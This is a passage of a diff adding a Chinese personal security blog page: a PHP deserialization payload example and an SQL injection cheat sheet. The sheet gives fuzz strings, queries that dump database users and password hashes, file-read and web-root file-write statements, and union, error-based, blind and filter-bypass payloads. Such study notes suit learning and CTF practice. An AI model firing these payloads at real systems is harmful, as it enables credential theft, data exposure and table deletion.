class="line">?&gt;</span><br></pre></td></tr></table></figure>
+    结果：O:6:&quot;K0rz3n&quot;:1:{s:12:&quot;%00K0rz3n%00test&quot;;O:4:&quot;Evil&quot;:1:{s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;}} ~~因为是私有属性，别忘了%00类名%00属性名~~
+
+&gt; PHP反序列化流程
+    1. 寻找unserialize函数的参数是否有我们的可控点
+    2. 寻找我们的反序列化的目标，重点寻找存在__wakeup或__destruct魔法函数的类
+    3. 一层一层地研究该类在魔法方法中使用的属性和属性调用的方法，看看是否有可控的属性能实现在当前调用的过程中触发的WA
+    4. 找到我们要控制的属性了以后我们就将要用到的代码部分复制下来，然后构造序列化，发起攻击
+
+&gt; PHP反序列化扩展phar://
+    待补充...</code></pre><h3 id="JAVA反序列化漏洞"><a href="#JAVA反序列化漏洞" class="headerlink" title="JAVA反序列化漏洞"></a>JAVA反序列化漏洞</h3><pre><code>没学过java不会待补充...</code></pre><h3 id="PYTHON反序列化漏洞"><a href="#PYTHON反序列化漏洞" class="headerlink" title="PYTHON反序列化漏洞"></a>PYTHON反序列化漏洞</h3><pre><code>待补充...</code></pre></div><div class="index-category-tag"><div class="level-item"><i class="fas fa-folder-open has-text-grey"> </i><a class="article-more button is-small link-muted" href="/categories/web/">web</a></div>  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted" href="/tags/web/">web</a><span> </span><a class="article-more button is-small link-muted" href="/tags/study/">study</a></div></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2019-11-23T15:59:16.000Z">2019-11-23</time><a class="commentCountImg" href="/2019/11/23/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/#comment-container"><span class="display-none-class">eeb1434a643e23abf9ce9ee060e82aa9</span><img class="not-gallery-item" src="/img/chat.svg"> <span class="commentCount" id="eeb1434a643e23abf9ce9ee060e82aa9"> 99+</span>    </a><span class="level-item">9 minutes lesen (Über 1383 Worte)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2019/11/23/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/">sql注入小知识</a></h1><div class="content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><hr>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="0x01-注入原理"><a href="#0x01-注入原理" class="headerlink" title="0x01 注入原理"></a>0x01 注入原理</h2><pre><code>SQL注入是指通过把SQL命令插入到Web表单提交或者输入域名处或者页面请求查询的字符串中，最终达到欺骗服务器来执行恶意的SQL命令。</code></pre><hr>
+<h2 id="0x02-注入成因"><a href="#0x02-注入成因" class="headerlink" title="0x02 注入成因"></a>0x02 注入成因</h2><ol>
+<li>程序编写者在处理应用程序和数据库交互时，使用字符串拼接的方式构造SQL语句</li>
+<li>未对用户可控参数进行足够的过滤便将参数内容拼接到SQL语句中去</li>
+</ol>
+<h2 id="0x03-注入分类"><a href="#0x03-注入分类" class="headerlink" title="0x03 注入分类"></a>0x03 注入分类</h2><h3 id="按技巧分类"><a href="#按技巧分类" class="headerlink" title="按技巧分类"></a>按技巧分类</h3><ol>
+<li>盲注  <ul>
+<li>布尔盲注：只能从应用返回中推断出语句执行后的布尔值</li>
+<li>时间盲注：应用没有明确的回显，只能通过特定的时间函数来判断</li>
+</ul>
+</li>
+<li>报错注入：应用会显示部分或全部的报错信息</li>
+<li>堆叠注入：有的应用在加入<kbd>;</kbd>后会一次执行多条语句</li>
+<li>二次注入：恶意数据存储并被读取并进入到SQL查询语句中所要引起的</li>
+<li>联合注入：通过union结合两条语句报错来注入获取信息</li>
+<li>其他</li>
+</ol>
+<h3 id="按获取数据分类"><a href="#按获取数据分类" class="headerlink" title="按获取数据分类"></a>按获取数据分类</h3><ol>
+<li>inband<ul>
+<li>利用web应用来直接获取数据</li>
+<li>通过站点响应或者反馈来获取数据</li>
+</ul>
+</li>
+<li>inference<ul>
+<li>通过web的一些反馈来推断数据</li>
+<li>通过web应用的反应来推断数据</li>
+</ul>
+</li>
+<li>out of band(OOB)<ul>
+<li>通过传输方式来获得数据，如DNS和STMP</li>
+</ul>
+</li>
+</ol>
+<h2 id="0x04-注入相关"><a href="#0x04-注入相关" class="headerlink" title="0x04 注入相关"></a>0x04 注入相关</h2><h3 id="注入检测点"><a href="#注入检测点" class="headerlink" title="注入检测点"></a>注入检测点</h3><ul>
+<li>GET/POST/PUT/DELETE参数</li>
+<li>HTTP参数头</li>
+<li>file name</li>
+</ul>
+<h3 id="fuzz-test"><a href="#fuzz-test" class="headerlink" title="fuzz test"></a>fuzz test</h3><ul>
+<li><kbd>'或者"或者)或者')或者")</kbd></li>
+<li><kbd>and 1=1</kbd></li>
+<li><kbd>and 1=2</kbd></li>
+<li><kbd>' and '1'='1或者" and "1"="1</kbd></li>
+<li><kbd>or 1=1</kbd></li>
+<li><kbd>or 1=0</kbd></li>
+<li><kbd>+ - ^ * % /</kbd></li>
+<li><kbd>|| | & &&</kbd></li>
+<li><kbd>! ~ </kbd></li>
+<li><kbd>反引号</kbd></li>
+</ul>
+<h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><ul>
+<li>– </li>
+<li>/* … */</li>
+<li>#</li>
+<li>`</li>
+<li>;%00</li>
+</ul>
+<h2 id="0x05-常用信息及语句"><a href="#0x05-常用信息及语句" class="headerlink" title="0x05 常用信息及语句"></a>0x05 常用信息及语句</h2><ul>
+<li>当前用户：user()</li>
+<li>当前数据库：database()</li>
+<li>当前版本：version()</li>
+</ul>
+<hr>
+<pre><code>所有用户：select group_concat(user) from mysql.user</code></pre><hr>
+<pre><code>所有密码：select group_concat(password) from mysql.user where user=&apos;用户名&apos;</code></pre><hr>
+<pre><code>所有数据库：select group_concat(schema_name) from information_schema.schemata</code></pre><hr>
+<pre><code>所有表：select group_concat(table_name) from information_schema.tables where table_schema=&quot;数据库库名&quot;</code></pre><hr>
+<pre><code>所有列：select group_concat(column_name) from information_schema.columns where table_name=&quot;表名&quot;</code></pre><hr>
+<pre><code>所有字段：select group_concat(字段名) from 列名</code></pre><hr>
+<pre><code>读文件：select load_file(&apos;ect/passwd&apos;)[读文件条件](https://www.cnblogs.com/blacksunny/p/8060028.html)</code></pre><hr>
+<pre><code>写文件：select select &apos;cat flag&apos; into &apos;/var/www/html/flag.php&apos;</code></pre><hr>
+<h2 id="0x06-注入方式"><a href="#0x06-注入方式" class="headerlink" title="0x06 注入方式"></a>0x06 注入方式</h2><ol>
+<li><p>union注入</p>
+<ul>
+<li>猜字段长度：order by num</li>
+<li>暴字段位置：and 1=2 union select 1,2,3 或者 id=-1 union select 1,2,3</li>
+<li>暴数据库和版本：and 1=2 union select 1,database(),version()</li>
+<li>暴表名：and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where schema_name=database()</li>
+<li>暴列名：and 1=2 union select 1,group_concat(columns_name),3 from information_schema.columns where table_name=”表名”</li>
+<li>暴字段：and 1=2 union select 1,group_concat(字段名),3 from 列名</li>
+</ul>
+</li>
+<li><p>报错注入</p>
+<ul>
+<li>floor：?id=1 or (select * from (select count(<em>),concat(0x7e,(select group_concat(table_name),0x7e),floor(rand(0)</em>2))x from information_schema.tables group by x)a)</li>
+<li>extractvalue：?id=1 and extractvalue(1,concat(0x7e,(select user()),0x7e))</li>
+<li>updatexml：?id=1 and updatexml(1,concat(0x7e,(select user()),0x7e),1)</li>
+<li>double query injection：?id=1 or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) 1</li>
+<li>exp(5.5.5以上)：?id=1 and (select exp(~(select * from(select user())x)))</li>
+</ul>
+</li>
+<li><p>布尔盲注</p>
+<blockquote>
+<p>正常情况</p>
+<pre><code>&apos; or bool #
+true&apos; and bool #</code></pre><p>不使用空格，注释</p>
+<pre><code>&apos;or(bool)=&apos;1
+true&apos;and(bool)=&apos;1</code></pre><p>不使用or,and,空格,注释</p>
+<pre><code>&apos;^!(bool)=&apos;1
+&apos;=(bool)=&apos;
+||(bool)=&apos;1
+true&apos;%26%26(bool)=&apos;1
+&apos;=if((bool),1,0)=&apos;0</code></pre><p>不使用等号,空格,注释</p>
+<pre><code>or(bool)&lt;&gt;&apos;0
+or((bool)in(1))or&apos;0</code></pre><p>其他</p>
+<pre><code>or (case when (bool) then 1 else 0 end)</code></pre><p>fuzz test</p>
+<pre><code>1&apos; or (bool) or &apos;1&apos;=&apos;1
+1%&apos; and (bool) and 1=1 and &apos;1&apos;=&apos;1</code></pre><p>一些逻辑判断函数</p>
+<pre><code>left(ascii(user()),1)&gt;112
+right(user(),1)&gt;&apos;a&apos;
+substr(user()1,1)&gt;&apos;a&apos;</code></pre><p>不使用逗号</p>
+<pre><code>user() regexp &apos;^[a-z]&apos;
+user() like &apos;root%&apos;
+POSITION(&apos;root&apos; in user())
+mid(user() from 1 for 1)=&apos;r&apos;
+mid(user() from 1)=&apos;r&apos;</code></pre><p>延时盲注</p>
+<pre><code>if((bool),sleep(3),0)
+BENCHMARK(100000,(bool)) or sleep(5)
+&apos; and if(ascii(substr((select database()),%d,1))&lt;%d,(select count(*) from information_schema.columns A,information_schema.columns B,information_schema.tables C),1)#
+select if(substr((select 1)=&apos;1&apos;,1,1),concat(rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;)) RLIKE &apos;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&apos;,1);#</code></pre></blockquote>
+</li>
+<li><p>无列名注入</p>
+<blockquote>
+<p>别名</p>
+<pre><code>union (select 1,2,c from (select 1,2 c union select * from flag)b) limit 1,1
+select c from (select * from (select 1 `a`)m join (select 0 `i`)o join (select 2 `b`)n join (select 3 `c`)t where 0 union select * from flag)x;</code></pre><p>pow()溢出</p>
+<pre><code>select 1 and (select user()) and pow(9999,99999)</code></pre></blockquote>
+</li>
+<li><p>可报错时暴库名，表名和列名</p>
+<blockquote>
+<p>字段名(union被过滤时)</p>
+<pre><code>select * from admin where id=1 and (select * from (select * from admin as a join admin as b using(id,password)) as c)</code></pre><p>表名</p>
+<pre><code>1&apos; and Polygon(id)</code></pre><p>库名</p>
+<pre><code>select * from admin where id =1-a()</code></pre></blockquote>
+</li>
+<li><p>二次注入<br> <img src="/images/sql/1.png" alt=""><br> <a href="https://www.freebuf.com/articles/web/167089.html">https://www.freebuf.com/articles/web/167089.html</a></p>
+</li>
+<li><p>堆叠注入<br> 原理：在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。<br> <a href="https://www.cnblogs.com/0nth3way/articles/7128189.html">https://www.cnblogs.com/0nth3way/articles/7128189.html</a></p>
+<h2 id="0x07-小技巧"><a href="#0x07-小技巧" class="headerlink" title="0x07 小技巧"></a>0x07 小技巧</h2><ol>
+<li>判断关键字是否被过滤<br><img src="/images/sql/2.png" alt=""></li>
+<li>判断注入类型<br><img src="/images/sql/3.png" alt=""></li>
+<li>宽字节注入<br><img src="/images/sql/4.png" alt=""></li>
+</ol>
+<hr>
+<p><strong>待补充中ing</strong></p>
+</li>
+</ol>
+</div><div class="index-category-tag"><div class="level-item"><i class="fas fa-folder-open has-text-grey"> </i><a class="article-more button is-small link-muted" href="/categories/web/">web</a></div>  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted" href="/tags/sql/">sql</a><span> </span><a class="article-more button is-small link-muted" href="/tags/web/">web</a></div></div></article></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><!--!--><div class="card widget"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="is-rounded" src="/img/avatar.png" alt="mahiro"></figure><p class="title is-size-4 is-block line-height-inherit">mahiro</p><p class="is-size-6 is-block">能成为萝莉控真的是太好啦！！！！！！！</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">9</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Kategorie</p><a href="/categories"><p class="title">1</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">5</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="/" target="_blank" rel="noopener">Folgen</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/mahiro424"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Weibo" href="/"><i class="fab fa-weibo"></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Email" href="/"><i class="fa fa-envelope"></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Next" href="/"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div><div><hr><p id="hitokoto">:D 一言句子获取中...</p><script type="text/javascript" defer>function getYiyan(){
+                                $.getJSON("https://v1.hitokoto.cn/", function (data) {
+                                if(data){
+                                    $('#hitokoto').html("");
+                                    $('#hitokoto').append("<strong style='color: #3273dc;'>"+data.hitokoto+"</strong>"+
+                                    "<p>"+"来源《"+data.from+"》</p><p>提供者-"+data.creator+"</p>");
+                                }});}
+                                $(function (){getYiyan();$('#hitokoto').click(function(){getYiyan();})});</script></div></div></div><div class="card widget"><div class="card-content"><div class="notification is-danger">You need to set <code>client_id</code> and <code>slot_id</code> to show this AD unit. Please set it in <code>_config.yml</code>.</div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><div class="card widget"><div class="card-content"><h3 class="menu-label">最新评论</h3><span class="body_hot_comment">加载中，最新评论有1分钟延迟...</span></div></div><div class="card widget"><div class="card-content"><h3 class="menu-label">Letzte Einträge</h3><article class="media"><div class="media-content size-small"><p><time dateTime="2020-03-31T07:59:57.000Z">2020-03-31</time></p><p class="title is-6"><a class="link-muted" href="/2020/03/31/WCTF2020-WP/">WCTF2020 WP(WEB)</a></p><p class="is-uppercase"></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-03-08T04:18:19.000Z">2020-03-08</time></p><p class="title is-6"><a class="link-muted" href="/2020/03/08/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%80%BB%E7%BB%93/">源码泄露总结</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey"> </i><a class="link-muted" href="/categories/web/">web</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-03-03T15:55:01.000Z">2020-03-03</time></p><p class="title is-6"><a class="link-muted" href="/2020/03/03/DNSLog%E8%AE%B0%E5%BD%95/">DNSLog记录</a></p><p class="is-uppercase"></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-03-03T01:56:58.000Z">2020-03-03</time></p><p class="title is-6"><a class="link-muted" href="/2020/03/03/HTTP/">HTTP</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey"> </i><a class="link-muted" href="/categories/web/">web</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-03-02T07:59:18.000Z">2020-03-02</time></p><p class="title is-6"><a class="link-muted" href="/2020/03/02/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8/">浏览器安全</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey"> </i><a class="link-muted" href="/categories/web/">web</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Kategorien</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/web/"><span class="level-start"><span class="level-item">web</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Archive</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2020/03/"><span class="level-start"><span class="level-item">March 2020</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/02/"><span class="level-start"><span class="level-item">February 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/11/"><span class="level-start"><span class="level-item">November 2019</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/study/"><span class="tag">study</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/web/"><span class="tag">web</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/web-study/"><span class="tag">-web -study</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ctf/"><span class="tag">ctf</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/sql/"><span class="tag">sql</span><span class="tag is-grey-lightest">1</span></a></div></div></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.png" alt="真寻の窝" height="28"></a><p class="size-small"><span>&copy; 2020 mahiro</span>  Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>,Modify by <a href="https://github.com/removeif/hexo-theme-amazing" target="_blank">removeif</a> <br><div class="size-small"><span id="busuanzi_container_site_uv">❤️感谢<strong> <span id="busuanzi_value_site_uv">99+</span> </strong></span>小伙伴的<strong> <span id="busuanzi_value_site_pv">99+</span> </strong>次光临！❤️</div></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/mahiro424"><i class="fab fa-github"></i></a></p></div><div class="sideMusic"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="/js/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script><meting-js style="width: auto;height: 2000px;" server="netease" type="playlist" id="887934910" theme="#2980b9" loop="all" autoplay="false" order="list" storageName="aplayer-setting" lrctype="0" list-max-height="400px" fixed="true"></meting-js></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script>moment.locale("zh");</script><script>var IcarusThemeSettings = {
+            site: {
+                url: 'http://yoursite.com',
+                external_link: {"enable":true,"exclude":[]}
+            },
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" defer></script><script src="/js/animation.js"></script><a id="back-to-top" title="Zurück nach oben" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back-to-top.js" defer></script><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.12/js/lightgallery-all.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js" defer></script><!--!--><!--!--><!--!--><script src="/js/toc.js" defer></script><script src="/js/main.js" defer></script><script>$.getScript('/js/comment-issue-data.js',function(){loadIssueData('a310e755c4962ccb6306','bf1d34612319156ee83867eccc73f64e4ff37768','mahiro424','gitcomment',false);})</script><link rel="stylesheet" href="/css/insight.css"><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Tippen Sie etwas..."><span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"></div></div></div></div><script>(function (window) {
+            var INSIGHT_CONFIG = {
+                TRANSLATION: {
+                    POSTS: 'Posts',
+                    PAGES: 'Seiten',
+                    CATEGORIES: 'Kategorien',
+                    TAGS: 'Tags',
+                    UNTITLED: '(Unbenannt)',
+                },
+                CONTENT_URL: '/content.json',
+            };
+            window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+        })(window);</script><script src="/js/insight.js" defer></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script><script type="text/javascript">var pjax = new Pjax({
+            elements: "a",//代表点击链接就更新
+            selectors: [  //代表要更新的节点
+                ".section",
+                "title"
+            ],
+            cache: true,
+            cacheBust:false
+        })
+
+        function loadBusuanzi(){
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js", function () {});
+        }
+
+        // 开始 PJAX 执行的函数
+        document.addEventListener('pjax:send', function () {
+        });
+        
+        // PJAX 完成之后执行的函数，可以和上面的重载放在一起
+        document.addEventListener('pjax:complete', function () {
+            $(".section").css({opacity:1});
+            if(true){
+                $.getScript('/js/comment-issue-data.js',function(){loadIssueData('a310e755c4962ccb6306','bf1d34612319156ee83867eccc73f64e4ff37768','mahiro424','gitcomment',false);});
+            }
+            if(false){
+                loadMathJax();
+            }
+            loadMainJs(jQuery, window.moment, window.ClipboardJS, window.IcarusThemeSettings);
+            loadBackTop();
+            loadBusuanzi();
+        });</script></body></html>
